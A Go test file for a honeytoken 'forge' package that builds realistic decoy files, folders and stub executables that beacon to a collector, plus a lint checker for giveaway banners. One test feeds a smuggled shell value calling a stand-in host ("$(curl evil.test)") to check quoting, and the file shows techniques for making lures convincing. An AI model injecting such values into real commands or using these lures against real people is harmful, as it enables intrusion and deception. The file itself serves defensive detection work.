package forge_test

import (
	"archive/zip"
	"bytes"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jimididit/kunari/internal/forge"
)

func TestForgeEnvRandomization(t *testing.T) {
	dir := t.TempDir()
	key := filepath.Join(dir, "key.hex")
	a, err := forge.Run(forge.Options{
		Type: "env", Name: "secrets", Theme: "devops", Detect: "beacon",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
		OutDir: dir, KeyPath: key, RegistryDB: filepath.Join(dir, "reg.db"),
	})
	if err != nil {
		t.Fatal(err)
	}
	b, err := forge.Run(forge.Options{
		Type: "env", Name: "secrets", Theme: "devops", Detect: "beacon",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
		OutDir: filepath.Join(dir, "b"), KeyPath: key,
	})
	if err != nil {
		t.Fatal(err)
	}
	ca, _ := os.ReadFile(a.ArtifactPath)
	cb, _ := os.ReadFile(b.ArtifactPath)
	if string(ca) == string(cb) {
		t.Fatal("expected randomized env artifacts to differ")
	}
	if a.TokenID == b.TokenID {
		t.Fatal("token ids must differ")
	}
}

func TestForgeEnvHasNoTripwireBanners(t *testing.T) {
	dir := t.TempDir()
	res, err := forge.Run(forge.Options{
		Type: "env", Name: "payroll-2024", Theme: "finance", Detect: "both",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := os.ReadFile(res.ArtifactPath)
	if err != nil {
		t.Fatal(err)
	}
	text := string(body)
	for _, bad := range []string{
		"AUTHORIZED TRIPWIRE",
		"decoy credentials",
		"canary_user",
		"not-a-real-password",
		"HEALTHCHECK_URL",
	} {
		if strings.Contains(text, bad) {
			t.Fatalf("env artifact must not contain %q; got:\n%s", bad, text)
		}
	}
	if !strings.Contains(text, "STATUS_URL=") {
		t.Fatalf("env artifact should use STATUS_URL; got:\n%s", text)
	}
	if !strings.Contains(text, "app_ro") {
		t.Fatalf("env artifact should use bland DB user; got:\n%s", text)
	}
}

func TestForgeFolderHasNoTripwireBanners(t *testing.T) {
	dir := t.TempDir()
	res, err := forge.Run(forge.Options{
		Type: "folder", Name: "hr-archive", Theme: "hr", Detect: "both",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-FOLDER",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	secrets, err := os.ReadFile(filepath.Join(res.DirPath, "secrets.env"))
	if err != nil {
		t.Fatal(err)
	}
	notes, err := os.ReadFile(filepath.Join(res.DirPath, "NOTES.txt"))
	if err != nil {
		t.Fatal(err)
	}
	combined := string(secrets) + "\n" + string(notes)
	for _, bad := range []string{
		"AUTHORIZED TRIPWIRE",
		"decoy credentials",
		"TRIPWIRE FOLDER",
		"kunari sentinel",
		"normal env decoy",
	} {
		if strings.Contains(combined, bad) {
			t.Fatalf("folder content must not contain %q; got:\n%s", bad, combined)
		}
	}
	if _, err := os.Stat(filepath.Join(res.DirPath, "README.txt")); err == nil {
		t.Fatal("folder must not ship README.txt (operator language); use NOTES.txt")
	}
}

func TestLintFlagsSlackWebhook(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "bad.env")
	_ = os.WriteFile(p, []byte("X=https://hooks.slack.com/services/T/B/X\n"), 0o644)
	r, err := forge.LintFile(p)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Findings) == 0 {
		t.Fatal("expected findings")
	}
}

func TestLintFlagsTripwireBannersCaseInsensitive(t *testing.T) {
	dir := t.TempDir()
	cases := []struct {
		name string
		body string
		want string
	}{
		{"upper", "# AUTHORIZED TRIPWIRE - not real\n", "tripwire banner"},
		{"mixed", "# Authorized Tripwire folder\n", "tripwire banner"},
		{"decoy", "# decoy credentials (inert)\n", "decoy credentials"},
		{"folder", "AUTHORIZED TRIPWIRE FOLDER - skip\n", "tripwire folder"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := filepath.Join(dir, tc.name+".txt")
			if err := os.WriteFile(p, []byte(tc.body), 0o644); err != nil {
				t.Fatal(err)
			}
			r, err := forge.LintFile(p)
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, f := range r.Findings {
				if strings.Contains(f, tc.want) {
					found = true
					break
				}
			}
			if !found {
				t.Fatalf("expected finding containing %q; got %+v", tc.want, r.Findings)
			}
		})
	}
}

func TestLintAllowsAKIAShapedLureKeys(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "lure.env")
	body := "AWS_ACCESS_KEY_ID=AKIATESTKEY12345678\nSTATUS_URL=https://beacon.example.com/b/abc\n"
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	r, err := forge.LintFile(p)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Findings) != 0 {
		t.Fatalf("AKIA-shaped lure keys must not fail lint; got %+v", r.Findings)
	}
}

func TestForgeSVG(t *testing.T) {
	dir := t.TempDir()
	_, err := forge.Run(forge.Options{
		Type: "svg", Name: "icon", Detect: "beacon",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
}

func TestForgeAllBeaconTypesEmbedCollector(t *testing.T) {
	collector := "https://beacon.example.com"
	zone := "canary.example.invalid"
	types := []struct {
		typ       string
		dnsOnlyOK bool
	}{
		{"env", true},
		{"svg", false},
		{"html", false},
		{"docx", false},
		{"xlsx", false},
		{"pdf", true},
		{"folder", true},
	}
	for _, tc := range types {
		t.Run(tc.typ, func(t *testing.T) {
			dir := t.TempDir()
			opt := forge.Options{
				Type: tc.typ, Name: "lab-" + tc.typ, Detect: "beacon",
				Collector: collector, AuthzRef: "LAB-BEACON",
				OutDir: dir, KeyPath: filepath.Join(dir, "k"),
				RegistryDB: filepath.Join(dir, "reg.db"),
			}
			res, err := forge.Run(opt)
			if err != nil {
				t.Fatal(err)
			}
			man, err := os.ReadFile(res.ManifestPath)
			if err != nil {
				t.Fatal(err)
			}
			if !strings.Contains(string(man), "/b/") {
				t.Fatalf("%s manifest missing beacon https path", tc.typ)
			}
			if !strings.Contains(string(man), collector) {
				t.Fatalf("%s manifest missing collector host", tc.typ)
			}
			// Zip-backed formats deflate the lure; plaintext types keep /b/ in the file.
			switch tc.typ {
			case "docx", "xlsx", "folder":
			default:
				body, err := os.ReadFile(res.ArtifactPath)
				if err != nil {
					t.Fatal(err)
				}
				if !strings.Contains(string(body), "/b/") {
					t.Fatalf("%s artifact missing HTTPS beacon path", tc.typ)
				}
			}
			lint, err := forge.LintFile(res.ArtifactPath)
			if err != nil {
				t.Fatal(err)
			}
			if len(lint.Findings) != 0 {
				t.Fatalf("%s lint findings: %+v", tc.typ, lint.Findings)
			}
		})
		if tc.dnsOnlyOK {
			t.Run(tc.typ+"/dns-only", func(t *testing.T) {
				dir := t.TempDir()
				res, err := forge.Run(forge.Options{
					Type: tc.typ, Name: "dns-" + tc.typ, Detect: "beacon",
					CollectorDNS: zone, AuthzRef: "LAB-DNS",
					OutDir: dir, KeyPath: filepath.Join(dir, "k"),
				})
				if err != nil {
					t.Fatal(err)
				}
				man, err := os.ReadFile(res.ManifestPath)
				if err != nil {
					t.Fatal(err)
				}
				if !strings.Contains(string(man), zone) {
					t.Fatalf("%s dns-only manifest missing zone", tc.typ)
				}
				if tc.typ != "folder" {
					body, err := os.ReadFile(res.ArtifactPath)
					if err != nil {
						t.Fatal(err)
					}
					if !strings.Contains(string(body), zone) {
						t.Fatalf("%s dns-only artifact missing zone %s", tc.typ, zone)
					}
				}
			})
		}
	}
}

func TestForgeFolderOmitsUNCIconResource(t *testing.T) {
	dir := t.TempDir()
	res, err := forge.Run(forge.Options{
		Type: "folder", Name: "hr-archive", Detect: "both",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-FOLDER",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasSuffix(res.ArtifactPath, "-folder.zip") {
		t.Fatalf("artifact %s", res.ArtifactPath)
	}
	zr, err := zip.OpenReader(res.ArtifactPath)
	if err != nil {
		t.Fatal(err)
	}
	defer zr.Close()
	foundDesktop := false
	for _, f := range zr.File {
		rc, err := f.Open()
		if err != nil {
			t.Fatal(err)
		}
		content, err := io.ReadAll(rc)
		_ = rc.Close()
		if err != nil {
			t.Fatal(err)
		}
		lower := strings.ToLower(string(content))
		if strings.Contains(lower, `iconresource=\\`) || strings.Contains(lower, "iconresource=\\\\") {
			t.Fatalf("zip entry %s contains UNC IconResource", f.Name)
		}
		if strings.HasSuffix(strings.ToLower(f.Name), "desktop.ini") {
			foundDesktop = true
			if !bytes.Contains(content, []byte("[.ShellClassInfo]")) {
				t.Fatalf("desktop.ini missing ShellClassInfo: %q", content)
			}
		}
	}
	if !foundDesktop {
		t.Fatal("expected desktop.ini in folder zip")
	}
	if res.DirPath == "" {
		t.Fatal("expected materialized directory path")
	}
	secrets := filepath.Join(res.DirPath, "secrets.env")
	if _, err := os.Stat(secrets); err != nil {
		t.Fatalf("materialized secrets.env: %v", err)
	}
	body, err := os.ReadFile(secrets)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(body), "/b/") {
		t.Fatal("materialized secrets.env missing HTTPS beacon")
	}
	notes, err := os.ReadFile(res.InstallPath)
	if err != nil {
		t.Fatal(err)
	}
	text := string(notes)
	if !strings.Contains(text, "secrets.env") || !strings.Contains(text, "NTLM") {
		t.Fatalf("install notes should recommend secrets.env and mention NTLM; got:\n%s", text)
	}
	if !strings.Contains(text, "weaker") && !strings.Contains(text, "not equivalent") {
		t.Fatalf("install notes should say directory watch is weaker; got:\n%s", text)
	}
}

func TestForgeStubExeBuildsZip(t *testing.T) {
	dir := t.TempDir()
	res, err := forge.Run(forge.Options{
		Type: "stub-exe", Name: "healthcheck", Detect: "beacon",
		Platforms: []string{"windows", "linux"},
		Collector: "https://beacon.example.com", AuthzRef: "LAB-STUB",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasSuffix(res.ArtifactPath, "-stubs.zip") {
		t.Fatalf("artifact %s", res.ArtifactPath)
	}
	man, err := os.ReadFile(res.ManifestPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(man), "/b/") {
		t.Fatal("stub manifest missing beacon https")
	}
	// Zip central directory should list both platform paths.
	raw, err := os.ReadFile(res.ArtifactPath)
	if err != nil {
		t.Fatal(err)
	}
	s := string(raw)
	if !strings.Contains(s, "windows-amd64/") || !strings.Contains(s, "linux-amd64/") {
		t.Fatalf("stub zip missing platform entries; names in zip local headers may be plain: %q", s[:min(200, len(s))])
	}
	notes, err := os.ReadFile(res.InstallPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(notes), "single HTTPS GET") {
		t.Fatalf("install notes should describe stub behavior; got:\n%s", notes)
	}
}

func TestInstallNotesDualLayerGuidance(t *testing.T) {
	dir := t.TempDir()
	res, err := forge.Run(forge.Options{
		Type: "env", Name: "secrets", Detect: "both",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := os.ReadFile(res.InstallPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(body), "package agent") || !strings.Contains(string(body), "Dual-layer") {
		t.Fatalf("detect=both install notes should mention package agent dual-layer; got:\n%s", body)
	}
	res2, err := forge.Run(forge.Options{
		Type: "env", Name: "agentonly", Detect: "sentinel",
		AuthzRef: "LAB-1", OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	body2, err := os.ReadFile(res2.InstallPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(body2), "--detect both") {
		t.Fatalf("detect=sentinel notes should prefer --detect both; got:\n%s", body2)
	}
}

func TestInstallNotesQuoteMemoAgainstShell(t *testing.T) {
	dir := t.TempDir()
	memo := "lab; $(curl evil.test) 'x'"
	res, err := forge.Run(forge.Options{
		Type: "env", Name: "secrets", Detect: "sentinel",
		Memo: memo, AuthzRef: "LAB-1",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := os.ReadFile(res.InstallPath)
	if err != nil {
		t.Fatal(err)
	}
	text := string(body)
	if strings.Contains(text, `--memo "`) {
		t.Fatal("memo must use POSIX single quotes, not Go/double quotes")
	}
	want := "--memo '" + strings.ReplaceAll(memo, "'", `'\''`) + "'"
	if !strings.Contains(text, want) {
		t.Fatalf("want %q in install notes; got:\n%s", want, text)
	}
}
